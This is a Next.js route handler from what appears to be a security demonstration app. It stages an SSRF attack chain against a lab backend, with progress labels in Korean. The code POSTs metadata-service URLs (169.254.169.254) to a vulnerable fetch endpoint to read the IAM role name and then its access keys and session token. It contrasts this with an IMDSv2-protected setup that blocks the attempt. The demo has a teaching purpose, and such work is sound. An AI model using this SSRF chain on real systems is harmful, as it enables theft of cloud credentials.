import { NextRequest } from 'next/server';
import { normalizeApiBaseUrl } from '@/lib/url-utils';
import { getTerraformOutputs } from '@/lib/terraform-state';

export const dynamic = 'force-dynamic';

const IMDS_BASE = 'http://169.254.169.254/latest/meta-data';
const STAGE_STEP_MS = 220;

const URL_MAP = {
  manual: {
    vulnerable: normalizeApiBaseUrl(process.env.VULNERABLE_API_URL || 'http://localhost:3000'),
    aws: normalizeApiBaseUrl(process.env.AWS_API_URL || ''),
  },
  auto: {
    vulnerable: normalizeApiBaseUrl(process.env.AUTO_VULNERABLE_API_URL || ''),
    aws: normalizeApiBaseUrl(process.env.AUTO_AWS_API_URL || ''),
  },
};

type Env = 'vulnerable' | 'aws';
type StageName = 'attacker' | 'cloudfront' | 'waf' | 'ecs' | 'app' | 's3';
type StageStatus = 'idle' | 'reached' | 'passed' | 'blocked' | 'failed' | 'success';
type Severity = 'info' | 'warning' | 'critical' | 'success';

interface ImdsCredentials {
  accessKeyId: string;
  secretAccessKey: string;
  token: string;
  expiration: string;
}

function sleep(ms: number) {
  return new Promise((r) => setTimeout(r, ms));
}

async function ssrfFetch(baseUrl: string, imdsPath: string, attempt: number) {
  const start = Date.now();
  try {
    const res = await fetch(`${baseUrl}/api/debug/fetch-url`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: `${IMDS_BASE}${imdsPath}` }),
      signal: AbortSignal.timeout(8000),
    });
    const latency = Date.now() - start;
    const text = await res.text();
    return { attempt, status: res.status, latency, body: text, blocked: res.status === 401 };
  } catch {
    return {
      attempt,
      status: 0,
      latency: Date.now() - start,
      body: '',
      blocked: false,
      error: 'connection_refused' as const,
    };
  }
}

function maskCredentials(raw: string): ImdsCredentials | null {
  try {
    const data = JSON.parse(raw) as Record<string, string>;
    if (!data.AccessKeyId) return null;
    const keyId = data.AccessKeyId;
    const maskedKey =
      keyId.length > 8
        ? `${keyId.slice(0, 4)}${'•'.repeat(keyId.length - 8)}${keyId.slice(-4)}`
        : keyId;
    return {
      accessKeyId: maskedKey,
      secretAccessKey: '•'.repeat(40),
      token: data.Token ? `${data.Token.slice(0, 12)}...(truncated)` : '(없음)',
      expiration: data.Expiration ?? '',
    };
  } catch {
    return null;
  }
}

export async function GET(request: NextRequest) {
  const searchParams = new URL(request.url).searchParams;
  const mode = searchParams.get('mode') === 'auto' ? 'auto' : 'manual';

  let vulnUrl = URL_MAP[mode].vulnerable;
  let awsUrl = URL_MAP[mode].aws;

  if (mode === 'auto' && (!vulnUrl || !awsUrl)) {
    const tf = await getTerraformOutputs();
    if (!vulnUrl) vulnUrl = tf.vulnerable?.backendUrl || '';
    if (!awsUrl) awsUrl = tf.secure?.backendUrl || '';
  }

  const VULNERABLE_URL = vulnUrl || 'http://localhost:3000';
  const AWS_URL = awsUrl;

  const encoder = new TextEncoder();
  const { readable, writable } = new TransformStream();
  const writer = writable.getWriter();

  const send = async (data: object) => {
    try {
      await writer.write(encoder.encode(`data: ${JSON.stringify(data)}\n\n`));
    } catch {}
  };

  const sendStage = async (
    env: Env,
    attempt: number,
    stage: StageName,
    status: StageStatus,
    title: string,
    description: string,
    severity: Severity,
  ) => {
    await send({ type: 'stage', env, attempt, stage, status, title, description, severity });
    await sleep(STAGE_STEP_MS);
  };

  (async () => {
    try {
      await send({ type: 'start' });

      // ─── Step 1: IMDS 역할명 조회 ────────────────────────────────────────
      await send({ type: 'chain_step', step: 1, status: 'running' });

      await sendStage(
        'vulnerable', 1, 'attacker', 'reached',
        'SSRF 페이로드 전송',
        'POST /api/debug/fetch-url → url=http://169.254.169.254/.../iam/security-credentials/ — 취약 서버를 경유해 내부 IMDS에 접근을 시도합니다.',
        'critical',
      );
      if (AWS_URL) {
        await sendStage(
          'aws', 1, 'attacker', 'reached',
          'SSRF 페이로드 전송',
          '동일한 SSRF 요청이 보안 환경으로도 전송됩니다.',
          'critical',
        );
      }

      const [vulnStep1, awsStep1] = await Promise.all([
        ssrfFetch(VULNERABLE_URL, '/iam/security-credentials/', 1),
        AWS_URL
          ? ssrfFetch(AWS_URL, '/iam/security-credentials/', 1)
          : Promise.resolve({ attempt: 1, status: -1, latency: 0, body: '', blocked: false }),
      ]);

      // 취약 환경: CloudFront/WAF 없이 EC2 직접 도달
      await sendStage(
        'vulnerable', 1, 'ecs', 'reached',
        'EC2 도달',
        'SSRF 요청이 취약 환경 EC2 백엔드에 도달했습니다. 백엔드가 IMDS에 내부 요청을 보냅니다.',
        'critical',
      );
      await sendStage(
        'vulnerable', 1, 'app',
        vulnStep1.status === 200 ? 'passed' : 'failed',
        vulnStep1.status === 200 ? 'IMDS 응답 반환 (IMDSv1)' : 'IMDS 접근 실패',
        vulnStep1.status === 200
          ? `http_tokens=optional — 토큰 없이 GET 요청으로 IAM 역할명 반환. 응답: "${vulnStep1.body.trim()}"`
          : `HTTP ${vulnStep1.status} — IMDS 접근 불가`,
        vulnStep1.status === 200 ? 'critical' : 'warning',
      );

      // 보안 환경: CloudFront → WAF(통과) → EC2 → IMDS(IMDSv2 차단)
      if (AWS_URL) {
        await sendStage(
          'aws', 1, 'cloudfront', 'passed',
          'CloudFront 경유',
          'SSRF 요청이 CloudFront 엣지를 통과합니다.',
          'info',
        );
        await sendStage(
          'aws', 1, 'waf', 'passed',
          'WAF 통과 — SSRF 무탐지',
          'WAF는 이 요청이 SSRF인지 판단하지 못합니다. 정상 POST 요청과 구별이 불가능합니다. 방어는 EC2 내부에서 이루어집니다.',
          'warning',
        );
        await sendStage(
          'aws', 1, 'ecs', 'reached',
          'EC2 도달',
          '보안 환경 EC2 백엔드가 SSRF 요청을 받아 IMDS에 내부 요청을 시도합니다.',
          'warning',
        );
        await sendStage(
          'aws', 1, 'app',
          awsStep1.blocked ? 'blocked' : awsStep1.status === 200 ? 'passed' : 'failed',
          awsStep1.blocked ? 'IMDSv2 차단 — 401 Unauthorized' : awsStep1.status === 200 ? 'IMDS 응답 반환' : 'IMDS 접근 실패',
          awsStep1.blocked
            ? 'http_tokens=required — 세션 토큰 없는 IMDS 접근을 즉시 거부합니다. SSRF는 PUT 토큰 발급 단계를 우회할 수 없습니다.'
            : `HTTP ${awsStep1.status}`,
          awsStep1.blocked ? 'success' : 'warning',
        );
      }

      const vulnRoleName = vulnStep1.status === 200
        ? vulnStep1.body.trim().split('\n')[0].trim()
        : null;

      await send({
        type: 'result', env: 'vulnerable',
        attempt: 1,
        status: vulnStep1.status,
        latency: vulnStep1.latency,
        blocked: false,
        label: vulnStep1.status === 200
          ? `IAM 역할 발견: ${vulnRoleName}`
          : `IMDS 접근 실패 (HTTP ${vulnStep1.status})`,
      });
      await send({
        type: 'result', env: 'aws',
        attempt: 1,
        status: awsStep1.status <= 0 ? -1 : awsStep1.status,
        latency: awsStep1.latency,
        blocked: awsStep1.blocked,
        label: awsStep1.blocked
          ? 'IMDSv2 차단 — 401'
          : awsStep1.status > 0
            ? `HTTP ${awsStep1.status}`
            : 'SKIPPED',
      });
      await send({
        type: 'chain_step', step: 1,
        status: vulnRoleName ? 'success' : 'failed',
        detail: vulnRoleName
          ? `IAM 역할 발견: ${vulnRoleName}`
          : `IMDS 접근 실패 (HTTP ${vulnStep1.status})`,
      });
      await sleep(600);

      // ─── Step 2: IAM 자격증명 탈취 ──────────────────────────────────────
      await send({ type: 'chain_step', step: 2, status: 'running' });

      let vulnCreds: ImdsCredentials | null = null;

      if (vulnRoleName) {
        const vulnStep2 = await ssrfFetch(
          VULNERABLE_URL,
          `/iam/security-credentials/${vulnRoleName}`,
          2,
        );

        await sendStage(
          'vulnerable', 2, 'app',
          vulnStep2.status === 200 ? 'success' : 'failed',
          vulnStep2.status === 200 ? '자격증명 탈취 성공' : '자격증명 조회 실패',
          vulnStep2.status === 200
            ? 'AccessKeyId, SecretAccessKey, Token 반환 완료. 이 자격증명으로 IAM 역할 권한 범위 내 모든 AWS API 호출이 가능합니다.'
            : `HTTP ${vulnStep2.status}`,
          vulnStep2.status === 200 ? 'critical' : 'warning',
        );

        vulnCreds = vulnStep2.status === 200 ? maskCredentials(vulnStep2.body) : null;

        await send({
          type: 'result', env: 'vulnerable',
          attempt: 2,
          status: vulnStep2.status,
          latency: vulnStep2.latency,
          blocked: false,
          label: vulnStep2.status === 200 ? '자격증명 탈취 성공' : `조회 실패 (HTTP ${vulnStep2.status})`,
        });
        await send({
          type: 'chain_step', step: 2,
          status: vulnStep2.status === 200 ? 'success' : 'failed',
          detail: vulnStep2.status === 200
            ? 'AccessKeyId, SecretAccessKey, Token 획득'
            : `자격증명 조회 실패 (HTTP ${vulnStep2.status})`,
          credentials: vulnCreds,
        });
      } else {
        await send({
          type: 'chain_step', step: 2,
          status: 'failed',
          detail: '1단계 실패로 인해 자격증명 조회 불가',
        });
      }

      // 보안 환경: 1단계에서 이미 차단, 2단계 실행 불가
      if (AWS_URL) {
        await send({
          type: 'result', env: 'aws',
          attempt: 2,
          status: -1,
          latency: 0,
          blocked: true,
          label: '1단계 IMDSv2 차단으로 실행 불가',
        });
      }

      await send({ type: 'complete' });
    } catch (e) {
      await send({ type: 'error', message: String(e) });
    } finally {
      writer.close();
    }
  })();

  return new Response(readable, {
    headers: {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
    },
  });
}
